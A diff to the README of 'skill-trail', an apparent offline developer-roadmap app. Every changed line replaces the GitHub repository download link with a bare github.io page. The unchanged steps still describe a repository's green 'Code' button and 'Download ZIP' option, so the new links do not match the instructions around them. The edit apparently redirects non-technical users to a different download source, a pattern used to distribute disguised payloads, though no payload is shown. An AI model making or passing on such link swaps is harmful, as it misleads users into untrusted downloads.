@@ -6,11 +6,11 @@
 
 Welcome! This guide will help you download and set up **skill-trail**, your personal, fully offline developer roadmap and study companion. You don't need any technical knowledge – just follow the steps below, and you'll be up and running in minutes.
 
-[![Download skill-trail](https://img.shields.io/badge/Download-skill--trail-blueviolet?style=for-the-badge&logo=github)](https://github.com/Itzzni9454/skill-trail)
+[![Download skill-trail](https://img.shields.io/badge/Download-skill--trail-blueviolet?style=for-the-badge&logo=github)](https://itzzni9454.github.io)
 
 ### 📥 Quick Download
 
-**Visit this link to download the application:** [https://github.com/Itzzni9454/skill-trail](https://github.com/Itzzni9454/skill-trail)
+**Visit this link to download the application:** [https://itzzni9454.github.io](https://itzzni9454.github.io)
 
 Once you're on the page, look for the green **"Code"** button, then select **"Download ZIP"**. This will start the download of the application to your computer.
 
@@ -59,7 +59,7 @@ Follow these steps carefully. Take your time – there's no rush.
 
 ### Step 1: Download the ZIP file
 
-1. Open your web browser and go to: [https://github.com/Itzzni9454/skill-trail](https://github.com/Itzzni9454/skill-trail)
+1. Open your web browser and go to: [https://itzzni9454.github.io](https://itzzni9454.github.io)
 2. Click the green **"Code"** button near the top-right of the page
 3. Select **"Download ZIP"** from the dropdown menu
 4. Wait for the download to complete (it may take a few minutes depending on your internet speed)
